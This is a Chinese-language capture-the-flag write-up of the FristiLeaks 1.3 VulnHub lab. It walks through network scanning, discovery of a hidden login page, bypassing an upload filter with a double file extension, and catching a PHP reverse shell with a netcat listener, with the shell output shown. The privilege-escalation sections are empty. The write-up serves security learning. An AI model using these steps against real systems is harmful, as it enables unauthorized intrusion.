
# Preface
这两天做了一个靶机，[fristileaks-13](https://www.vulnhub.com/entry/fristileaks-13,133/)，有时候觉得自己的速度真的是很慢，所以提醒一下自己要懂得：快就是慢，慢就是快。环境搭建都很简单，只需要注意以下修改虚拟机的mac地址，否则虚拟机获取不到地址，看了靶机说明才发现的：
<font color="red">VMware users will need to manually edit the VM's MAC address to: 08:00:27:A5:A6:76</font>

# Information Gathering
照例我们先做一下信息收集工作，netdiscover嗅探靶机地址:确定目标地址是192.168.0.103
```shell
┌──(root㉿kali)-[~]
└─# netdiscover -r 192.168.0.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 12 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 720
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.0.106   b4:2e:99:86:d5:f2      3     180  GIGA-BYTE TECHNOLOGY CO.,LTD.
 192.168.0.1     60:3a:7c:31:e8:66      7     420  TP-LINK TECHNOLOGIES CO.,LTD.
 192.168.0.3     a4:5e:60:c2:d9:0b      1      60  Apple, Inc.
 192.168.0.103   08:00:27:a5:a6:76      1      60  PCS Systemtechnik GmbH
```
确定完地址后我们对端口、服务及版本号、操作系统做一下信息收集：
```shell
┌──(root㉿kali)-[/fristileaks13]
└─# cat nmap.text
# Nmap 7.92 scan initiated Fri Jun 17 08:27:47 2022 as: nmap -sT -T5 -p- -sC -A -Pn -oN nmap.text 192.168.0.103
Nmap scan report for 192.168.0.103
Host is up (0.0010s latency).
Not shown: 65448 filtered tcp ports (no-response), 86 filtered tcp ports (host-unreach)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-robots.txt: 3 disallowed entries
|_/cola /sisi /beer
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.05 ms 192.168.0.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 17 08:29:17 2022 -- 1 IP address (1 host up) scanned in 89.60 seconds
```
可以看到目标机器只开放了80端口，robots.txt中有三个目录/cola /sisi /beer，操作系统版本：OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13

# Vulnerability Analysis
浏览器查看一下主页 <br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/1.png" width="56%" display="block"> <br />
浏览器查看一下robots.txt
```shell
┌──(root㉿kali)-[/fristileaks13]
└─# curl -s http://192.168.0.101/robots.txt
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```
这些目录,这三个目录都是同一张图片, <br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/2.png" width="16%" display="block"> <br />
同时/images/存在目录遍历，可以列出该目录下的所有内容。<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/3.png" width="36%" display="block"> <br />
nikto 扫描一下web漏洞：
```shell
┌──(root㉿kali)-[/fristileaks13]
└─# cat nikto.txt
- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.0.101
+ Target Port: 80
+ GET Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET "robots.txt" contains 3 entries which should be manually viewed.
+ HEAD Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ HEAD PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
+ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: GET /icons/: Directory indexing found.
+ OSVDB-3268: GET /images/: Directory indexing found.
+ OSVDB-3233: GET /icons/README: Apache default file found.
```
目前为止没有特别的发现，因此对目录进行扫描：

同样没有发现有价值的目录信息，事情进行到这里就只能回归原点进行，首页有个图片，上面写着keep calm and drink fristi，联想到网站的目录都是cola、sisi、beer都是饮料，因此猜测有可能存在fristi目录：<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/4.png" width="46%" display="block"> <br />
通过分析这个目录的源码可以发现，可能的用户名有：admin/eezeepz，同时还存在一段怀疑是Base64编码的数据，尝试使用base64解码成图片： <br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/5.png" width="46%" display="block"> <br />
这个图片上的字符：keKkeKKeKKeKkEkkEk猜测可能是密码，于是尝试登陆，eezeepz/keKkeKKeKKeKkEkkEk组合能够正常登陆，而admin/keKkeKKeKKeKkEkkEk组合无法正常登陆。<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/6.png" width="46%" display="block"> <br />
发现一个链接，点进去后是一个长传页面，怀疑存在文件上传漏洞：<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/7.png" width="46%" display="block"> <br />

# Exploitation
经过测试正常的图片.png/.jpg/.gif是可以上传的，<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/8.png" width="46%" display="block"> <br />
但是.php的文件是无法上传的：<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/9.png" width="46%" display="block"> <br />
尝试使用多层文件扩展后缀，寄希望于服务器能解析，尝试上传一个php反弹shell木马，发现上传成功<br />
<img src="https://raw.githubusercontent.com/eagleatman/mywriteup/main/fristiLeaks-1.3/images/10.png" width="46%" display="block"> <br />

访问http://192.168.0.101/fristi/uploads/php-reverse-shell.php.png，Kali监听nc -lnvp 80，成功获取一个webshell。
```shell
┌──(root㉿kali)-[~]
└─# nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.0.100] from (UNKNOWN) [192.168.0.101] 35224
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 04:38:38 up  8:23,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.1$
```


# Post-Exploitation

# Privilege Escalation

# Conclusion

